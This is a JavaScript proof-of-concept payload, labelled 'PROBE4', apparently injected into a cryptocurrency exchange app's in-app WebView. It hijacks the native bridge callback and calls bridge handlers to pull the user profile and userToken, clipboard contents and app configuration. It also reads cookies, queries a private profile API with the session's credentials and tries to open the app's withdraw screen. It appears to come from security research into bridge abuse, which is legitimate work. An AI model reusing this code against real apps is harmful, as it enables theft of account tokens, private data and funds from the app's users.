(function () {
  var R = {}, prof = null;
  window._b_bridge_callback_ = function (o) {
    try { var d = (typeof o === "string") ? JSON.parse(o) : o;
      R["cb:" + d.moduleName + "." + d.methodName] = JSON.stringify(d.params).slice(0, 1400);
      if (d.params && d.params.userToken) prof = d.params;
    } catch (e) {}
    render();
  };
  window.invokeCallback = window._b_bridge_callback_;
  function call(m, f, p) {
    return window.flutter_inappwebview.callHandler("_b_bridge_" + m + "_",
      JSON.stringify({ moduleName: m, methodName: f, uniqueId: "u" + Math.random().toString(36).slice(2), params: p || {} }));
  }
  function render() {
    var s = "=== PROBE4 ===\n";
    Object.keys(R).forEach(function (k) { s += "\n[" + k + "]\n" + R[k] + "\n"; });
    document.documentElement.innerHTML = "<pre style='font:10px monospace;white-space:pre-wrap;word-break:break-all;background:#fff;color:#000;padding:4px'>" + s.replace(/</g, "&lt;") + "</pre>";
  }
  render();

  // 1. is the in-app WebView carrying a www.bybit.com web session?
  fetch("/x-api/v2/private/user/profile", { credentials: "include" })
    .then(function (r) { return r.text().then(function (t) { R["websession:/x-api/v2/private/user/profile"] = r.status + " " + t.slice(0, 300); render(); }); })
    .catch(function (e) { R["websession"] = "ERR " + e; render(); });

  R["cookies(document.cookie)"] = document.cookie.slice(0, 400) || "(empty / httpOnly)";

  // 2. bridge reads
  call("UserProfile", "getUserProfile", {});
  call("SystemInfo", "getTextFromClipboard", {});
  call("SystemInfo", "getAppConfig", {});

  // 3. can the page drive in-app navigation?
  setTimeout(function () {
    call("Router", "push", { url: "bybitapp://open/withdraw" })
      .then(function (r) { R["Router.push(withdraw) direct"] = JSON.stringify(r); render(); })
      .catch(function (e) { R["Router.push"] = "ERR " + e; render(); });
  }, 3500);
})();
